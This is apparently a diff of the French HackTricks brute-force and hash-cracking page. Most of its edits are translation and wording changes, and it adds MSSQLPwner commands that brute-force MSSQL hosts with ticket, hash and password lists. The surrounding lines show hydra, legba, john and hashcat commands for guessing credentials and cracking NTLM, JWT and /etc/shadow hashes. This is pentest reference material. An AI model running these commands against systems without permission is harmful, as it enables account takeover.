@@ -14,7 +14,7 @@ Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/grte.png" alt=
 
 <details>
 
-<summary>Soutenir HackTricks</summary>
+<summary>Supportez HackTricks</summary>
 
 * Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
@@ -142,7 +142,7 @@ legba scylla --username cassandra --password wordlists/passwords.txt --target lo
 msf> use auxiliary/scanner/couchdb/couchdb_login
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
 ```
-### Docker Registry
+### Registre Docker
 ```
 hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
 ```
@@ -240,6 +240,25 @@ use auxiliary/scanner/mongodb/mongodb_login
 legba mongodb --target localhost:27017 --username root --password data/passwords.txt
 ```
 ### MSSQL
+
+[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
+```shell
+# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt
+
+# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt
+
+# Bruteforce using tickets against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt
+
+# Bruteforce using passwords against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt
+
+# Bruteforce using hashes against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
+```
+
 ```bash
 legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
 ```
@@ -405,7 +424,7 @@ legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --targ
 ```
 #### Clés SSH faibles / PRNG prévisible Debian
 
-Certains systèmes présentent des défauts connus dans la graine aléatoire utilisée pour générer du matériel cryptographique. Cela peut entraîner une réduction dramatique de l'espace de clés qui peut être bruteforcé avec des outils tels que [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Des ensembles pré-générés de clés faibles sont également disponibles, tels que [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
+Certains systèmes présentent des défauts connus dans la graine aléatoire utilisée pour générer du matériel cryptographique. Cela peut entraîner une réduction dramatique de l'espace de clés qui peut être bruteforced avec des outils tels que [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Des ensembles pré-générés de clés faibles sont également disponibles, tels que [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
 
 ### STOMP (ActiveMQ, RabbitMQ, HornetQ et OpenMQ)
 
@@ -540,7 +559,7 @@ python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5h
 python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
 john jwt.john #It does not work with Kali-John
 ```
-### Crack NTLM
+### NTLM cracking
 ```bash
 Format:USUARIO:ID:HASH_LM:HASH_NT:::
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
@@ -727,7 +746,7 @@ hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
 ```bash
 hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
-Cracking Linux Hashes - fichier /etc/shadow
+Casser les hachages Linux - fichier /etc/shadow
 ```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
 3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
@@ -757,7 +776,7 @@ Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt=
 
 <summary>Soutenir HackTricks</summary>
 
-* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
+* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
 
